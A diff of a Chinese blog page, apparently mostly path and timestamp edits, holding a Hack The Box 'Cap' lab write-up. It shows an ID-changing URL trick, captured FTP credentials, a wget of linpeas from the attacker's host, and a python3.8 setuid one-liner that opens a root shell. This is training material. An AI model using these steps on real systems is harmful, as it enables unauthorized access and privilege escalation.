@@ -26,25 +26,25 @@
 <meta property="og:site_name" content="Suzen">
 <meta property="og:description" content="USER FLAG先用nmap扫一下 1nmap 10.10.10.245   发现21，22，80端口 先看看80端口的  在这个页面可以看到有下载流量包的地方，但是这个流量包里没有有用信息 不过发现URL中后面跟着的数字，尝试改成0，然后下载 1http:&#x2F;&#x2F;10.10.10.245&#x2F;data&#x2F;0   可以发现登录成功的字段，还有USER、PASS这种用户名密码的，并且是FTP协议  TCP追">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/164407720.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/164544068.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/164649107.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/165025646.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/164928233.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/165318714.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/175652436.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/175443451.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/175839903.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/175734812.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/175929742.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/180107908.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/180153735.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/23/Cap/image-20251223164407720.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/23/Cap/image-20251223164544068.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/23/Cap/image-20251223164649107.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/23/Cap/image-20251223165025646.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/23/Cap/image-20251223164928233.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/23/Cap/image-20251223165318714.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/23/Cap/image-20251223175652436.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/23/Cap/image-20251223175443451.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/23/Cap/image-20251223175839903.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/23/Cap/image-20251223175734812.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/23/Cap/image-20251223175929742.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/23/Cap/image-20251223180107908.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/23/Cap/image-20251223180153735.png">
 <meta property="article:published_time" content="2025-12-23T10:10:03.000Z">
-<meta property="article:modified_time" content="2025-12-23T10:11:12.011Z">
+<meta property="article:modified_time" content="2025-12-23T10:38:14.359Z">
 <meta property="article:author" content="Suzen">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/164407720.png">
+<meta name="twitter:image" content="https://yschen20.github.io/2025/12/23/Cap/image-20251223164407720.png">
 <meta name="twitter:creator" content="@Suzen">
   
   
@@ -433,7 +433,7 @@
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2025-12-23T18:11:12+08:00
+                    本文最后更新于 2025-12-23T18:38:14+08:00
                   
                   
 
@@ -446,26 +446,26 @@
                 <h1 id="USER-FLAG"><a href="#USER-FLAG" class="headerlink" title="USER FLAG"></a>USER FLAG</h1><p>先用nmap扫一下</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap 10.10.10.245<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/164407720.png" srcset="/img/loading.gif" lazyload alt="image-20251223164407720"></p>
+<p><img src="/2025/12/23/Cap/image-20251223164407720.png" srcset="/img/loading.gif" lazyload alt="image-20251223164407720"></p>
 <p>发现<code>21</code>，<code>22</code>，<code>80</code>端口</p>
 <p>先看看<code>80</code>端口的</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/164544068.png" srcset="/img/loading.gif" lazyload alt="image-20251223164544068"></p>
+<p><img src="/2025/12/23/Cap/image-20251223164544068.png" srcset="/img/loading.gif" lazyload alt="image-20251223164544068"></p>
 <p>在这个页面可以看到有下载流量包的地方，但是这个流量包里没有有用信息</p>
 <p>不过发现URL中后面跟着的数字，尝试改成<code>0</code>，然后下载</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">10.10.10.245</span>/data/<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/164649107.png" srcset="/img/loading.gif" lazyload alt="image-20251223164649107"></p>
+<p><img src="/2025/12/23/Cap/image-20251223164649107.png" srcset="/img/loading.gif" lazyload alt="image-20251223164649107"></p>
 <p>可以发现登录成功的字段，还有USER、PASS这种用户名密码的，并且是FTP协议</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/165025646.png" srcset="/img/loading.gif" lazyload alt="image-20251223165025646"></p>
+<p><img src="/2025/12/23/Cap/image-20251223165025646.png" srcset="/img/loading.gif" lazyload alt="image-20251223165025646"></p>
 <p>TCP追踪流看一下</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/164928233.png" srcset="/img/loading.gif" lazyload alt="image-20251223164928233"></p>
+<p><img src="/2025/12/23/Cap/image-20251223164928233.png" srcset="/img/loading.gif" lazyload alt="image-20251223164928233"></p>
 <p>可以得到用户名和密码</p>
 <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">USER</span> <span class="hljs-title">nathan</span><br>PASS Buck3tH4TF0RM3!<br></code></pre></td></tr></table></figure>
 
 <p>尝试利用获取到的用户名和密码去登录22端口，可以登录成功，21端口也可以</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh nathan@10.10.10.245<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/165318714.png" srcset="/img/loading.gif" lazyload alt="image-20251223165318714"></p>
+<p><img src="/2025/12/23/Cap/image-20251223165318714.png" srcset="/img/loading.gif" lazyload alt="image-20251223165318714"></p>
 <p>就能得到第一个flag了</p>
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">1</span>b<span class="hljs-number">2266</span>adb<span class="hljs-number">9</span>df<span class="hljs-number">9</span>cb<span class="hljs-number">387059</span>bf<span class="hljs-number">5</span>dce<span class="hljs-number">75</span><span class="hljs-keyword">c</span><span class="hljs-number">14</span><br></code></pre></td></tr></table></figure>
 
@@ -473,24 +473,24 @@
 <p>在本地开启一个服务</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -S 0:80<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/175652436.png" srcset="/img/loading.gif" lazyload alt="image-20251223175652436"></p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/175443451.png" srcset="/img/loading.gif" lazyload alt="image-20251223175443451"></p>
+<p><img src="/2025/12/23/Cap/image-20251223175652436.png" srcset="/img/loading.gif" lazyload alt="image-20251223175652436"></p>
+<p><img src="/2025/12/23/Cap/image-20251223175443451.png" srcset="/img/loading.gif" lazyload alt="image-20251223175443451"></p>
 <p>利用<code>wget</code>命令将<code>linpeas</code>传到靶机服务器上，并给可执行权限</p>
 <blockquote>
 <p>linpeas工具：<a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng/releases">https://github.com/peass-ng/PEASS-ng/releases</a></p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/175839903.png" srcset="/img/loading.gif" lazyload alt="image-20251223175839903"></p>
+<p><img src="/2025/12/23/Cap/image-20251223175839903.png" srcset="/img/loading.gif" lazyload alt="image-20251223175839903"></p>
 </blockquote>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://10.10.16.65/linpeas.sh<br><span class="hljs-built_in">chmod</span> +x linpeas.sh<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/175734812.png" srcset="/img/loading.gif" lazyload alt="image-20251223175734812"></p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/175929742.png" srcset="/img/loading.gif" lazyload alt="image-20251223175929742"></p>
+<p><img src="/2025/12/23/Cap/image-20251223175734812.png" srcset="/img/loading.gif" lazyload alt="image-20251223175734812"></p>
+<p><img src="/2025/12/23/Cap/image-20251223175929742.png" srcset="/img/loading.gif" lazyload alt="image-20251223175929742"></p>
 <p>可以扫到能利用python3.8进行提权</p>
 <p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/python/">https://gtfobins.github.io/gtfobins/python/</a></p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/180107908.png" srcset="/img/loading.gif" lazyload alt="image-20251223180107908"></p>
+<p><img src="/2025/12/23/Cap/image-20251223180107908.png" srcset="/img/loading.gif" lazyload alt="image-20251223180107908"></p>
 <p>直接获取root权限，并读取root flag</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3.8 -c <span class="hljs-string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;</span><br><span class="hljs-built_in">cat</span> /root/root.txt<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/180153735.png" srcset="/img/loading.gif" lazyload alt="image-20251223180153735"></p>
+<p><img src="/2025/12/23/Cap/image-20251223180153735.png" srcset="/img/loading.gif" lazyload alt="image-20251223180153735"></p>
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">55</span>d<span class="hljs-number">64e20218</span><span class="hljs-keyword">c</span><span class="hljs-number">50e05</span>d<span class="hljs-number">7910</span>d<span class="hljs-number">66</span>ab<span class="hljs-number">8752</span><span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure>
 
 
@@ -518,13 +518,6 @@
     
   <a href="/categories/%E6%B8%97%E9%80%8F/HTB/" class="category-chain-item">HTB</a>
   
-  
-    <span>></span>
-    
-  <a href="/categories/%E6%B8%97%E9%80%8F/HTB/%E9%9D%B6%E6%9C%BA/" class="category-chain-item">靶机</a>
-  
-  
-
   
 
   
